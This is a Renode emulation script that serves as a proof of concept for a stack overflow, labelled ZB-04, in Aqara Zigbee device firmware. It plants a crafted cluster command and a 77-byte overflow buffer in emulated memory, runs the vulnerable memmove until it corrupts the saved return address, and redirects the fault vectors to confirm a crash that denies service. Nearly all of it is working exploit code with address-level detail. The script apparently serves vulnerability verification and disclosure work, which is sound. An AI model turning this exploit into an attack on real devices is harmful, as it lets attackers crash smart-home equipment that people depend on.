:name: ZB-04 Aqara n0agl1 — DoS PROOF (corrupted return address -> fault vector taken) [Series 1 / EFR32MG13 / Cortex-M4]
:description: Extends the natural-dispatch reachability PoC (zb04_dispatch_inject.resc) one decisive step further: instead of stopping after the memmove, it lets sub_5014 reach its OWN epilogue `pop {r4,r5,r6,pc}` @0x5066 with the return address already corrupted by the overflow (0xDEADBEEF -> 0xDEADBEAA), and proves the resulting crash by REDIRECTING the CPU fault vectors (HardFault/MemManage/BusFault/UsageFault @VTOR+0x0C..0x18, VTOR=0x4000) to a RAM trap stub (`b .` @0x2000EE00). The ONLY way PC can reach 0x2000EE00 is via the ARM exception-entry mechanism, so PC==0x2000EE00 after the pop is an unambiguous, non-inferred demonstration that the corrupted return address faults = denial of service.
#
# ============================ WHY THIS IS A CLEAN PROOF ============================
#   The earlier attempt inferred the DoS ("bit0=0 + unmapped -> must fault") and then chased
#   post-fault PCs (0xe480/0xde1c/0xdea8) that were in fact the firmware's own fault handler --
#   but that was never confirmed, only guessed. This script removes the guesswork: we overwrite
#   the fault vectors with a known trap address we control. A fetch of the corrupted PC
#   (0xDEADBEAA: bit0=0 => UsageFault INVSTATE; address unmapped => BusFault; either escalates to
#   HardFault) transfers control THROUGH the vector table. PC landing on OUR stub can only happen
#   via exception entry. No firmware address is hooked; no PC is forced after the sink entry.
#
#   Constrained-overflow recap (from zb04_dispatch_inject.resc, reproduced): the 82-byte reception
#   cap limits the memmove to count=77, which fully overwrites saved R4/R5/R6 and ONLY the LOW BYTE
#   of the saved return address (0xEF->0xAA). That single controllable byte is enough to make the
#   return address invalid -> guaranteed fault. It is NOT enough for arbitrary PC control (why ZB-04
#   is DoS, not RCE).
# =======================================================================================

using sysbus
emulation SetGlobalSerialExecution true
mach create "zb04"
machine LoadPlatformDescription @platforms/boards/silabs/brd4162a.repl
macro reset
"""
    sysbus LoadELF @scripts/silabs-vuln/zb04_aqara.elf
    cpu VectorTableOffset 0x4000
"""
runMacro $reset
logLevel 3

# Natural-dispatch chain markers (same as zb04_dispatch_inject.resc).
cpu AddHook 0xb9dc "self.ErrorLog('MARK_B9DC_ENTRY')"
cpu AddHook 0x5014 "self.ErrorLog('MARK_5014_SINK_ENTRY')"
cpu AddHook 0x502a "self.ErrorLog('MARK_502A_MEMMOVE')"
cpu AddHook 0x5042 "self.ErrorLog('MARK_5042_POST_MEMMOVE')"
# Epilogue: read the exact value the pop will load into PC (proves the corrupted RA is used).
cpu AddHook 0x5066 "self.ErrorLog('MARK_5066_EPILOGUE  pop will load PC = [SP+0xC] = 0x{0:X}'.format(self.Bus.ReadDoubleWord(self.GetRegister(13).RawValue + 0xC)))"
# Trap stub: the ONLY route here is the fault vector. Firing it = DoS proven.
# The stub is `b .` (self loop), so once PC enters it, it stays there regardless of remaining
# steps -- no need to force IsHalted (which is not honored mid-Step on this MG13 image).
cpu AddHook 0x2000EE00 "self.ErrorLog('>>> FAULT VECTOR TAKEN: CPU vectored to trap stub @0x2000EE00 -- corrupted return address crashed the CPU (DoS confirmed)')"

# Boot through clock/power/radio bring-up.
emulation RunFor "0.3"
pause
echo ">>> post-boot PC:"
cpu PC

# --- Install RAM trap stub: 0xE7FE = `b .` (self loop) at 0x2000EE00 -------------------
sysbus WriteWord 0x2000EE00 0xE7FE
# --- Redirect the four programmable fault vectors to the stub (thumb bit set).
#     NOTE: the ELF's reset vector table is at 0x4000, but the firmware RELOCATES SCB->VTOR to
#     0x4200 during boot (confirmed via zb04_dos_diag.resc: VTOR=0x4200, HardFault vec@0x420C=
#     0xE41D). The LIVE table the CPU uses at fault time is therefore 0x4200, so we patch there:
#     HardFault=+0x0C=0x420C  MemManage=+0x10=0x4210  BusFault=+0x14=0x4214  UsageFault=+0x18=0x4218
sysbus WriteDoubleWord 0x420C 0x2000EE01
sysbus WriteDoubleWord 0x4210 0x2000EE01
sysbus WriteDoubleWord 0x4214 0x2000EE01
sysbus WriteDoubleWord 0x4218 0x2000EE01
echo ">>> LIVE fault vectors after redirect (expect 0x2000EE01 each: HardFault/MemManage/BusFault/UsageFault):"
sysbus ReadDoubleWord 0x420C
sysbus ReadDoubleWord 0x4210
sysbus ReadDoubleWord 0x4214
sysbus ReadDoubleWord 0x4218

# --- FORCED gate/lookup scaffolding (identical to zb04_dispatch_inject.resc) -----------
sysbus WriteDoubleWord 0x200059f4 0x00000001
sysbus WriteWord 0x1bff6 0x2001
sysbus WriteWord 0x1bff8 0x4770

# --- Crafted EmberAfClusterCommand `cmd` @0x2000A000 -----------------------------------
sysbus WriteDoubleWord 0x2000A000 0x2000A100
sysbus WriteDoubleWord 0x2000A008 0x2000B000
sysbus WriteDoubleWord 0x2000A00C 0x00000052
sysbus WriteDoubleWord 0x2000A010 0x0000115F
sysbus WriteByte 0x2000A014 0x05
sysbus WriteByte 0x2000A015 0x00
sysbus WriteByte 0x2000A00F 0x00
sysbus WriteDoubleWord 0x2000A100 0xFCC00000
sysbus WriteByte 0x2000A105 0x01

# --- Source buffer (77 bytes 0xAA from 0x2000B005) -------------------------------------
sysbus WriteDoubleWord 0x2000B000 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B004 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B008 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B00C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B010 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B014 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B018 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B01C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B020 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B024 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B028 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B02C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B030 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B034 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B038 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B03C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B040 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B044 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B048 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B04C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B050 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B054 0xAAAAAAAA

# --- Register contract; LR=0xDEADBEEF so the corrupted saved-LR = 0xDEADBEAA -----------
sysbus.cpu SetRegister 13 0x2000F000
sysbus.cpu SetRegister 14 0xDEADBEEF
sysbus.cpu SetRegister 0  0x2000A000
sysbus.cpu PC 0xB9DC

# --- STAGE 1: natural dispatch -> sink -> memmove. 346 steps reaches 0x5044 (post-memmove).
#     (After the memmove sub_5014 enters a slow post-copy completeness loop before its epilogue;
#      that loop does NOT touch the saved-LR slot, so we confirm the corruption here and then
#      drive the function's OWN epilogue directly -- the minimal scaffold to observe the return.)
sysbus.cpu Step 346
echo ">>> post-memmove PC (expect 0x5044):"
cpu PC
echo ">>> saved LR @0x2000EFFC (expect 0xDEADBEAA - corrupted by the natural memmove) ="
sysbus ReadDoubleWord 0x2000EFFC

# --- STAGE 2: execute sub_5014's REAL epilogue `pop {r4,r5,r6,pc}` @0x5066 on the corrupted
#     frame. At the pop, SP = 0x2000EFF0 (prologue push{r4,r5,r6,lr}); SP+0xC = 0x2000EFFC =
#     the corrupted saved-LR slot. Stepping the pop loads PC = 0xDEADBEAA; the next fetch faults
#     (bit0=0 => UsageFault INVSTATE; unmapped => BusFault) and vectors to our trap stub.
sysbus.cpu SetRegister 13 0x2000EFF0
sysbus.cpu PC 0x5066
echo ">>> at epilogue: pop will load PC = [SP+0xC] = 0x2000EFFC ="
sysbus ReadDoubleWord 0x2000EFFC
sysbus.cpu Step 3

echo ">>> FINAL PC (expect 0x2000EE00 = trap stub = fault vector was taken):"
cpu PC
quit
